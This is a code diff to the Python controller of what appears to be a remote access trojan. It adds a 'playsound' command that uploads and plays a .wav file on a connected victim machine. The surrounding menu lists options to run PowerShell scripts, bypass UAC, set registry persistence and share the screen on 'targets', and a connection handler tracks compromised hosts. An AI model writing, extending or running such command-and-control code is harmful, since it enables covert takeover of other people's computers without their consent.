@@ -300,6 +300,7 @@ def target_communication(target, ip):
                     changepolicy                       --> execute powershell scripts
                     cwallpaper                         --> change wallpaper
                     bypass-uac                         --> try to bypass uac
+                    playsound                          --> play wav file in the background (just .wav)
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
@@ -336,6 +337,21 @@ def target_communication(target, ip):
                     print("[-] File Not Found")
             elif command[:5] == 'start':
                 print(target.recv(1024).decode())
+            elif command[:9] == 'playsound':
+                if command[10:][-4:] != '.wav':
+                    target.send('nsupport'.encode())
+                    print(target.recv(1024).decode())
+
+
+                else:
+                    target.send('supported'.encode())
+                    print("[*] Uploading Wav File to the Target")
+                    try:
+                        upload_file(target,command[10:])
+                    except:
+                        print("[-] Failed Uploading The File")
+                    else:
+                        print("[+] Wav File Started")
                     
             else:
                 result = reliable_recv(target)
@@ -360,6 +376,7 @@ def accept_connections():
             key = open('key.txt', 'r').read()
             cred = target.recv(1024).decode().split(':')
             user = cred[1]
+
             if  cred[0]== key and user not in users:
                 users.append(user)
                 targets.append(target)
